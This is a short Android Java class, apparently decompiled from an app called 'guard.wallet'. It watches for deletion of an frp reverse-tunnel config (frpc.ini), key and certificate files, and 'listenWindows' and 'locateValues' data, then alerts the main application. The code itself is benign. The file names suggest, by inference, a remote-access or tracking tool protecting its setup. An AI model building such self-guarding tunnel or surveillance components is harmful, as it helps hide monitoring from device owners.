package com.guard.wallet.observer;

import com.guard.wallet.core.AppUtils;

import android.os.FileObserver;
import android.util.Log;
import com.guard.wallet.MainApplication;

/**
 * vendor y.b -> ConfigFileObserver
 *
 * FileObserver -- 配置文件删除监听。
 * 监视指定目录的 DELETE 事件，当 frpc.ini / private.key / cert.pem /
 * listenWindows.json / locateValues.json 被删除时通知 MainApplication。
 */
public class ConfigFileObserver extends FileObserver {
    private static final String TAG = "ConfigFileObserver";
    private final String dir;

    public ConfigFileObserver(String path, int mask) {
        super(path, mask);
        this.dir = path;
    }

    @Override
    public void onEvent(int event, String path) {
        if (event == FileObserver.DELETE && path != null) {
            try {
                MainApplication app = MainApplication.getInstance();
                if (app != null) {
                    app.onConfigFileDelete(path);
                }
            } catch (Exception e) {
                AppUtils.s(TAG, e);
            }
        }
    }
}
